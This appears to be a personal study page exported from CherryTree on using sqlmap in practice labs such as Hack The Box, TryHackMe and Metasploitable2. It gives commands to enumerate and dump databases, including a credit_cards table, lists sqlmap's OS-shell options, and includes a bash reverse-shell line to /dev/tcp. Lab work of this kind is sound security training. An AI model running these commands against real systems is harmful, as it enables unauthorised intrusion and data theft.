<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Sqlmap</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Sqlmap</h1><br/>SQLmap is an open-source tool used in penetration testing to detect and exploit SQL<br />injection flaws. SQLmap automates the process of detecting and exploiting SQL<br />injection. SQL Injection attacks can take control of databases that utilize SQL.<br /><br />The sqlmap comes pre-installed with Parrot OS &amp; Kali Linux, however, you can install it through the<br />repository if you don&#39;t have it:<br /><br />sudo apt install sqlmap<br /><br /><a href=""><img src="images/35-1.png" alt="images/35-1.png" /></a><br /><br />We will provide the URL &amp; the cookie to the sqlmap in order for it to find vulnerability. The reason why we<br />have to provide a cookie is because of authentication:<br /><br /><br />To grab the cookie, we can intercept any request in Burp Suite &amp; get it from there,  OR  you can install a<br />great extension for your web browser called cookie-editor :<br /><br />The cookies in HTTP messages of requests are usually set the following way: [Found from cookie editor]<br /><br />PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1<br /><br />Knowing that, here&#39;s how our sqlmap syntax should look:<br /><br />sqlmap -u &#39;<a href="http://10.129.95.174/dashboard.php?search=any+query'">http://10.129.95.174/dashboard.php?search=any+query&#39;</a> --cookie=&quot;PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1&quot;<br /><br /><a href=""><img src="images/35-2.png" alt="images/35-2.png" /></a><br /><br />Note: We got the shell in sqlmap, however, it is not very stable &amp; interactive. To make it much stable, we will use the<br />following payload:<br />bash -c &quot;bash -i &gt;&amp; /dev/tcp/{your_IP}/443 0&gt;&amp;1&quot;<br /><br />This method is used to bring <strong>sqlmap</strong> shell into our netcat listener.<br /><br /><br /><br /><strong>Using Metaploitable2:::::</strong><br />Enumeration-Choose options wisely<br />sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; <br /><br />To get all Databases:<br />sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; --dbs<br /><br />To get all Tables of a Database(owasp10):<br /> sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; --tables -D oswasp10<br /> <br /> To get all columns of a table (credit_cards) from database (owasp10):<br /> sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; --columns -T credit_cards -D owasp10<br /> <br /> To dump all data of a table:<br /> sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; -T credit_cards -D owasp10 --dump<br /> <br /> <br /> <br /><strong> Example of gaming website THM:</strong><br /> <br /><em>sqlmap -r request.txt --dbms=mysql --dump</em><br /><br />Where request.txt is a GET request captured by <em>burpsuite</em> for a “test” search querry.<br /><br /><br /><strong><br />SQLMAP Room THM:</strong><br /><br /><em><strong>https://github.com/sqlmapproject/sqlmap<br /></strong></em><br />sqlmap -h 	:	To list help with most common commands<br />sqlmap -hh	:	To list advanced help with all commands<br /><br /><strong>Basic Commands:</strong><br /><table class="table"><tr><th>Options</th><th>Description</th></tr><tr><td>-u URL, --url=URL</td><td>Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</td></tr><tr><td>--data=DATA</td><td>Data string to be sent through POST (e.g. &quot;id=1&quot;)</td></tr><tr><td>--random-agent</td><td>Use randomly selected HTTP User-Agent header value</td></tr><tr><td>-p TESTPARAMETER</td><td>Testable parameter(s)</td></tr><tr><td>--level=LEVEL</td><td>Level of tests to perform (1-5, default 1)</td></tr><tr><td>--risk=RISK</td><td>Risk of tests to perform (1-3, default 1)</td></tr></table><br /><br /><br /><strong>Enumeration Commands:</strong><br /><em>These options can be used to enumerate the back-end database management system information, structure, and data contained in tables.</em><br /><table class="table"><tr><th>Options</th><th>Description</th></tr><tr><td>-a, --all</td><td>Retrieve everything</td></tr><tr><td>-b, --banner</td><td>Retrieve DBMS banner</td></tr><tr><td>--current-user</td><td>Retrieve DBMS current user</td></tr><tr><td>--current-db</td><td>Retrieve DBMS current database</td></tr><tr><td>--passwords</td><td>Enumerate DBMS users password hashes</td></tr><tr><td>--dbs</td><td>Enumerate DBMS databases</td></tr><tr><td>--tables</td><td>Enumerate DBMS database tables</td></tr><tr><td>--columns</td><td>Enumerate DBMS database table columns</td></tr><tr><td>--schema</td><td>Enumerate DBMS schema</td></tr><tr><td>--dump</td><td>Dump DBMS database table entries</td></tr><tr><td>--dump-all</td><td>Dump all DBMS databases tables entries</td></tr><tr><td>--is-dba</td><td>Detect if the DBMS current user is DBA</td></tr><tr><td>-D &lt;DB NAME&gt;</td><td>DBMS database to enumerate</td></tr><tr><td>-T &lt;TABLE NAME&gt;</td><td>DBMS database table(s) to enumerate</td></tr><tr><td>-C COL</td><td>DBMS database table column(s) to enumerate</td></tr></table><br /><br /><br /><strong>Operating System Access Commands:</strong><br /><em>These options can be used to access the back-end database management system on the target operating system.</em><br /><table class="table"><tr><th>Options</th><th>Description</th></tr><tr><td>--os-shell</td><td>Prompt for an interactive operating system shell</td></tr><tr><td>--os-pwn</td><td>Prompt for an OOB shell, Meterpreter or VNC</td></tr><tr><td>--os-cmd=OSCMD</td><td>Execute an operating system command</td></tr><tr><td>--priv-esc</td><td>Database process user privilege escalation</td></tr><tr><td>--os-smbrelay</td><td>One-click prompt for an OOB shell, Meterpreter or VNC</td></tr></table><br /><br /><br /><strong>Simple HTTP GET Based Test</strong><br /><br />Format:<br /><em><strong>sqlmap -u https://testsite.com/page.php?id=7 --dbs</strong></em><br /><br /><br /><strong>Simple HTTP POST Based Test</strong><br />We copy the POST request to a file. (From Burpsuite copy to file or selecting the entire text in Burpsuite and copy it to a file. (say <strong>req.txt</strong>)<br /><strong>Note:</strong> In case of post request we need to find the vulnerable payload location.<br />Eg. blood_group=A<br /><br />Format:<br /><em>sqlmap -r &lt;request_file&gt; -p &lt;vulnerable_parameter&gt; --dbs</em><br /><em><strong>sqlmap -r req.txt -p blood_group --dbs</strong></em><br /><br /><strong>Note:</strong> --dbs is used to enumerate the database. <em>It will list all databases.</em><br /><br /><br /><strong>Then we can continue enumerating as follows (Enumerating Tables):</strong><br /><br /><strong>Using GET based Method</strong><br /><em>sqlmap -u https://testsite.com/page.php?id=7 -D &lt;database_name&gt; --tables</em><br /><em><strong>sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables</strong></em><br /><br /><strong>Using POST based Method</strong><br /><em>sqlmap -r req.txt -p &lt;vulnerable_parameter&gt; -D &lt;database_name&gt; --tables</em><br /><em><strong>sqlmap -r req.txt -p blood_group -D blood --tables</strong></em><br /><br /><br /><strong>Then we can continue enumerating as follows (Enumerating Columns):</strong><br /><br /><strong>Using GET based Method</strong><br /><em>sqlmap -u https://testsite.com/page.php?id=7 -D &lt;database_name&gt; -T &lt;table_name&gt; --columns</em><br /><em><strong>sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns<br /></strong></em><br /><strong>Using POST based Method</strong><br /><em>sqlmap -r req.txt -p &lt;vulnerable_parameter&gt; -D &lt;database_name&gt; -T &lt;table_name&gt; --columns</em><br /><em><strong>sqlmap -r req.txt -p blood_group -D blood -T blood_db --columns</strong></em><br /><br /><strong>Note:</strong> Here -p switch can be ignored becasue, sqlmap will resume from previous calls. (Else it is required in POST method during initial call)<br /><br /><br /><strong>Finally to Dump the entire database:</strong><br /><br /><strong>Using GET based Method</strong><br /><em>sqlmap -u https://testsite.com/page.php?id=7 -D &lt;database_name&gt; --dump-all</em><br /><em><strong>sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all<br /></strong></em><br /><strong>Using POST based Method</strong><br /><em>sqlmap -r req.txt -p &lt;vulnerable_parameter&gt; -D &lt;database_name&gt; --dump-all</em><br /><em><strong>sqlmap -r req.txt -p blood_group -D blood --dump-all</strong></em><br /><br /></div>
</body>
</html>
